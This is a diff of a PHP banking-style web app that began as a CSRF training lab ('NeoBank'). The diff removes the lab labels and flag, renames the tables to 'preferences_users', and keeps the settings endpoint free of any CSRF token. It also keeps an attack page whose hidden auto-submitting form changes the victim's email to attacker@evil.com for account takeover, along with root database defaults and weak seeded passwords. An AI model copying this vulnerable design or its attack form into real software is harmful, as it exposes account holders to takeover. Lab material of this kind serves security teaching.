@@ -1,50 +1,50 @@
 <?php
-// Lab 1308 — CSRF Basics: Email Change Without Token
-// Platform: "NeoBank" — fictional online banking / fintech app
-// Vulnerability: POST /index.php?action=settings has NO CSRF token.
-//   Any cross-origin form can silently change the victim's account email,
-//   enabling password-reset account takeover.
-// Difficulty: Easy (Training) | Pure black-box — no hints in UI
+// NeoBank — Online Banking Platform
 
-session_set_cookie_params([
-    'lifetime' => 0,
-    'path'     => '/',
-    'secure'   => true,
-    'httponly'  => true,
-    'samesite' => 'None',
-]);
-session_start();
+$isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
+    || (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
 
-$db_hosts = ['krazeplanet', '127.0.0.1', 'localhost', '172.19.0.1', 'host.docker.internal'];
-$db = null;
-foreach ($db_hosts as $h) {
-    $db = @new mysqli($h, 'root', '');
-    if (!$db->connect_error) {
-        $db->query("CREATE DATABASE IF NOT EXISTS `KrazePlanet_DB` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
-        $db->select_db('KrazePlanet_DB');
-        break;
+if (session_status() === PHP_SESSION_NONE) {
+    session_set_cookie_params([
+        'lifetime' => 0,
+        'path'     => '/',
+        'secure'   => $isHttps,
+        'httponly' => true,
+        'samesite' => $isHttps ? 'None' : 'Lax',
+    ]);
+    session_start();
+}
+
+mysqli_report(MYSQLI_REPORT_OFF);
+
+$db_host = getenv('DB_HOST') ?: '127.0.0.1';
+$db_user = getenv('DB_USER') ?: 'root';
+$db_pass = getenv('DB_PASS') ?: '';
+$db_name = getenv('DB_NAME') ?: 'KrazePlanet_DB';
+
+$db = @new mysqli($db_host, $db_user, $db_pass, $db_name);
+if ($db->connect_error) {
+    foreach (['localhost', '127.0.0.1', 'krazeplanet'] as $fallback_host) {
+        $db = @new mysqli($fallback_host, $db_user, $db_pass, $db_name);
+        if (!$db->connect_error) break;
     }
 }
-if (!$db || $db->connect_error) { die('DB connection failed: ' . ($db ? $db->connect_error : 'Unable to connect to database')); }
-if ($db->connect_error) {
-    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB error: ' . htmlspecialchars($db->connect_error) . '</h3>');
+
+if (!$db || $db->connect_error) {
+    die('<h3 style="padding:32px;font-family:sans-serif;color:#c00">DB connection error: ' . htmlspecialchars($db ? $db->connect_error : 'Could not connect to database') . '</h3>');
 }
+$db->set_charset('utf8mb4');
 
-$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
-$host   = $scheme . '://' . $_SERVER['HTTP_HOST'];
-
-$loginUrl     = $host . '/index.php';
-$registerUrl  = $host . '/index.php?action=register';
-$dashUrl      = $host . '/index.php?action=dashboard';
-$settingsUrl  = $host . '/index.php?action=settings';
-$logoutUrl    = $host . '/index.php?logout=1';
-$attackUrl    = $host . '/index.php?attack=1';
-
-define('LAB_FLAG', 'flag{csrf_basics_email_change_account_takeover_1308}');
-define('VICTIM_EMAIL', 'victim@neobank.io');
+$baseUri     = $_SERVER['SCRIPT_NAME'] ?? '/subdomains/preferences/index.php';
+$loginUrl    = $baseUri;
+$registerUrl = $baseUri . '?action=register';
+$dashUrl     = $baseUri . '?action=dashboard';
+$settingsUrl = $baseUri . '?action=settings';
+$logoutUrl   = $baseUri . '?logout=1';
+$attackUrl   = $baseUri . '?attack=1';
 
 // ── Tables ────────────────────────────────────────────────────────────────────
-$db->query("CREATE TABLE IF NOT EXISTS lab1308_users (
+$db->query("CREATE TABLE IF NOT EXISTS preferences_users (
     id             INT AUTO_INCREMENT PRIMARY KEY,
     username       VARCHAR(100)   NOT NULL UNIQUE,
     email          VARCHAR(255)   NOT NULL UNIQUE,
@@ -56,12 +56,12 @@ $db->query("CREATE TABLE IF NOT EXISTS lab1308_users (
 )");
 
 // ── Seed accounts ─────────────────────────────────────────────────────────────
-$check = $db->query("SELECT id FROM lab1308_users WHERE email='emma@neobank.io'");
+$check = $db->query("SELECT id FROM preferences_users WHERE email='emma@neobank.io'");
 if ($check && $check->num_rows === 0) {
     $h1 = password_hash('emma@123',  PASSWORD_BCRYPT);
     $h2 = password_hash('carlos@123', PASSWORD_BCRYPT);
     $h3 = password_hash('aisha@123', PASSWORD_BCRYPT);
-    $db->query("INSERT INTO lab1308_users (username, email, password, balance, account_number) VALUES
+    $db->query("INSERT INTO preferences_users (username, email, password, balance, account_number) VALUES
         ('emma_watson',  'emma@neobank.io',  '$h1', 8240.00,  'NB-2026-1101'),
         ('carlos_ruiz',  'carlos@neobank.io','$h2', 15670.50, 'NB-2026-1102'),
         ('aisha_patel',  'aisha@neobank.io', '$h3', 5920.00,  'NB-2026-1103')");
@@ -88,9 +88,9 @@ if ($isLogout) {
 
 // ── Load session user ─────────────────────────────────────────────────────────
 $currentUser = null;
-if (!empty($_SESSION['lab1308_uid'])) {
-    $st = $db->prepare("SELECT * FROM lab1308_users WHERE id = ?");
-    $st->bind_param('i', $_SESSION['lab1308_uid']);
+if (!empty($_SESSION['preferences_uid'])) {
+    $st = $db->prepare("SELECT * FROM preferences_users WHERE id = ?");
+    $st->bind_param('i', $_SESSION['preferences_uid']);
     $st->execute();
     $currentUser = $st->get_result()->fetch_assoc();
     $st->close();
@@ -104,10 +104,10 @@ if ($isRegister && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if ($uname && $email && $pass) {
         $hashed = password_hash($pass, PASSWORD_BCRYPT);
         $accNum = 'NB-' . date('Y') . '-' . rand(1000, 9999);
-        $st = $db->prepare("INSERT INTO lab1308_users (username, email, password, balance, account_number) VALUES (?,?,?,0.00,?)");
+        $st = $db->prepare("INSERT INTO preferences_users (username, email, password, balance, account_number) VALUES (?,?,?,0.00,?)");
         $st->bind_param('ssss', $uname, $email, $hashed, $accNum);
         if ($st->execute()) {
-            $_SESSION['lab1308_uid'] = $db->insert_id;
+            $_SESSION['preferences_uid'] = $db->insert_id;
             header('Location: ' . $dashUrl);
             exit;
         }
@@ -123,13 +123,13 @@ if (!$isRegister && !$isSettings && $_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = trim($_POST['email'] ?? '');
     $pass  = $_POST['password'] ?? '';
     if ($email && $pass) {
-        $st = $db->prepare("SELECT * FROM lab1308_users WHERE email = ?");
+        $st = $db->prepare("SELECT * FROM preferences_users WHERE email = ?");
         $st->bind_param('s', $email);
         $st->execute();
         $user = $st->get_result()->fetch_assoc();
         $st->close();
         if ($user && password_verify($pass, $user['password'])) {
-            $_SESSION['lab1308_uid'] = $user['id'];
+            $_SESSION['preferences_uid'] = $user['id'];
             header('Location: ' . $dashUrl);
             exit;
         }
@@ -146,7 +146,7 @@ if ($isSettings && $_SERVER['REQUEST_METHOD'] === 'POST' && $currentUser) {
     if ($newEmail) {
         if (filter_var($newEmail, FILTER_VALIDATE_EMAIL)) {
             $uid = (int)$currentUser['id'];
-            $st  = $db->prepare("UPDATE lab1308_users SET email=?, csrf_pwnd=1 WHERE id=?");
+            $st  = $db->prepare("UPDATE preferences_users SET email=? WHERE id=?");
             $st->bind_param('si', $newEmail, $uid);
             if ($st->execute()) {
                 $st->close();
@@ -177,7 +177,7 @@ if (!$currentUser && !$isAttack && !$isRegister && $action) {
 
 // ── Reload user after possible POST update ────────────────────────────────────
 if ($isSettings && $currentUser) {
-    $st = $db->prepare("SELECT * FROM lab1308_users WHERE id = ?");
+    $st = $db->prepare("SELECT * FROM preferences_users WHERE id = ?");
     $st->bind_param('i', $currentUser['id']);
     $st->execute();
     $currentUser = $st->get_result()->fetch_assoc();
@@ -273,10 +273,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
 .nb-settings-card{background:#fff;border-radius:12px;border:1px solid #E2E8F0;overflow:hidden;margin-bottom:16px;}
 .nb-settings-hdr{padding:13px 20px;background:#F8FAFC;border-bottom:1px solid #E2E8F0;font-size:.75rem;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.05em;}
 .nb-settings-body{padding:20px;}
-.nb-flag-banner{background:#FEF2F2;border:1px solid #FECACA;border-radius:10px;padding:18px 20px;margin-bottom:20px;}
-.nb-flag-title{font-size:.75rem;font-weight:700;color:#DC2626;text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px;}
-.nb-flag-label{font-size:.78rem;color:#6B7280;margin-bottom:6px;}
-.nb-flag-val{font-family:'Courier New',Courier,monospace;font-size:.9rem;font-weight:700;color:#111827;background:#F9FAFB;border:1px solid #E5E7EB;padding:10px 14px;border-radius:6px;word-break:break-all;}
 
 /* ── ATTACK PAGE ───────────────────────────────────────────────────────────── */
 .nb-atk-bg{min-height:100vh;background:#0F172A;display:flex;align-items:center;justify-content:center;padding:24px;}
@@ -311,7 +307,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-s
   <!-- ⚠ CSRF form: POSTs to /index.php?action=settings — no CSRF token.
        Victim's account email is silently changed to attacker@evil.com. -->
   <form id="csrfForm"
-        action="/index.php?action=settings"
+        action="<?= $settingsUrl ?>"
         method="POST"
         style="display:none;">
     <input type="hidden" name="new_email" value="attacker@evil.com">
@@ -379,15 +375,15 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
      SETTINGS PAGE — Email change form (VULNERABLE: no CSRF token)
      ══════════════════════════════════════════════════════════════════════════ -->
 <nav class="nb-nav">
-  <a href="/index.php?action=dashboard" class="nb-logo">
+  <a href="<?= $dashUrl ?>" class="nb-logo">
     <div class="nb-logo-icon"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
     NeoBank
   </a>
-  <a href="/index.php?action=dashboard" class="nb-nav-link">Overview</a>
-  <a href="/index.php?action=settings"  class="nb-nav-link active">Settings</a>
+  <a href="<?= $dashUrl ?>" class="nb-nav-link">Overview</a>
+  <a href="<?= $settingsUrl ?>"  class="nb-nav-link active">Settings</a>
   <div class="nb-nav-right">
     <span class="nb-nav-user">Signed in as <span><?= esc($currentUser['username']) ?></span></span>
-    <a href="/index.php?logout=1" class="nb-nav-logout">Sign Out</a>
+    <a href="<?= $logoutUrl ?>" class="nb-nav-logout">Sign Out</a>
   </div>
 </nav>
 
@@ -426,7 +422,7 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
     <div class="nb-settings-hdr">Update Email Address</div>
     <div class="nb-settings-body">
       <!-- ⚠ VULNERABLE: no csrf_token hidden field -->
-      <form method="POST" action="/index.php?action=settings">
+      <form method="POST" action="<?= $settingsUrl ?>">
         <div class="nb-field">
           <label>New Email Address</label>
           <input type="email" name="new_email" placeholder="Enter new email address" autocomplete="email">
@@ -442,15 +438,15 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
      DASHBOARD PAGE
      ══════════════════════════════════════════════════════════════════════════ -->
 <nav class="nb-nav">
-  <a href="/index.php?action=dashboard" class="nb-logo">
+  <a href="<?= $dashUrl ?>" class="nb-logo">
     <div class="nb-logo-icon"><svg viewBox="0 0 24 24"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></div>
     NeoBank
   </a>
-  <a href="/index.php?action=dashboard" class="nb-nav-link active">Overview</a>
-  <a href="/index.php?action=settings"  class="nb-nav-link">Settings</a>
+  <a href="<?= $dashUrl ?>" class="nb-nav-link active">Overview</a>
+  <a href="<?= $settingsUrl ?>"  class="nb-nav-link">Settings</a>
   <div class="nb-nav-right">
     <span class="nb-nav-user">Signed in as <span><?= esc($currentUser['username']) ?></span></span>
-    <a href="/index.php?logout=1" class="nb-nav-logout">Sign Out</a>
+    <a href="<?= $logoutUrl ?>" class="nb-nav-logout">Sign Out</a>
   </div>
 </nav>
 
@@ -531,7 +527,7 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
 
     <?php if ($error): ?><div class="nb-error"><?= esc($error) ?></div><?php endif; ?>
 
-    <form method="POST" action="/index.php?action=register">
+    <form method="POST" action="<?= $registerUrl ?>">
       <div class="nb-field">
         <label>Full Name (Username)</label>
         <input type="text" name="username" placeholder="john_smith" required autocomplete="username">
@@ -548,7 +544,7 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
     </form>
 
     <div class="nb-auth-footer">
-      Already have an account? <a href="/index.php">Sign in</a>
+      Already have an account? <a href="<?= $loginUrl ?>">Sign in</a>
     </div>
   </div>
 </div>
@@ -567,7 +563,7 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
 
     <?php if ($error): ?><div class="nb-error"><?= esc($error) ?></div><?php endif; ?>
 
-    <form method="POST" action="/index.php">
+    <form method="POST" action="<?= $loginUrl ?>">
       <div class="nb-field">
         <label>Email Address</label>
         <input type="email" name="email" placeholder="you@example.com" required autocomplete="email">
@@ -587,7 +583,7 @@ setTimeout(function() { document.getElementById('csrfForm').submit(); }, 1500);
     </div>
 
     <div class="nb-auth-footer">
-      New customer? <a href="/index.php?action=register">Open an account</a>
+      New customer? <a href="<?= $registerUrl ?>">Open an account</a>
     </div>
   </div>
 </div>
